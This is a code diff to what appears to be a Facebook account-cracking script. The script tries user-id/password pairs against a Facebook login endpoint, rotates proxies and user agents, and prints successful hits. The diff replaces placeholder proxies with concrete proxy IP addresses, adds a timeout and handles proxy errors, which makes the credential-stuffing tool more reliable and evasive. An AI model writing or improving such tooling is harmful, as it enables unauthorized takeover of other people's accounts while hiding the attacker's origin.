@@ -71,9 +71,9 @@ def random_ua():
 
 #----------------------------[PROXY SUPPORT]--------------------------------#
 PROXIES = [
-    "http://proxy1:port",
-    "http://proxy2:port",
-    "http://proxy3:port"
+    "http://45.77.56.113:3128",  # Example proxy 1
+    "http://51.158.68.68:8811",  # Example proxy 2
+    "http://51.158.68.133:8811"  # Example proxy 3
 ]
 
 def get_random_proxy():
@@ -95,7 +95,7 @@ def facebook_login(uid, password):
     
     try:
         session = requests.Session()
-        response = session.get(url, headers=headers, proxies=proxies).json()
+        response = session.get(url, headers=headers, proxies=proxies, timeout=10).json()
         
         if "session_key" in response:
             print(f"{G}[SUCCESS] {uid} | {password}")
@@ -106,6 +106,8 @@ def facebook_login(uid, password):
         else:
             print(f"{R}[FAILED] {uid} | {password}")
             
+    except requests.exceptions.ProxyError:
+        print(f"{R}[PROXY ERROR] Invalid or unreachable proxy: {proxy}")
     except requests.exceptions.ConnectionError:
         print(f"{R}No Internet Connection!")
     except Exception as e:
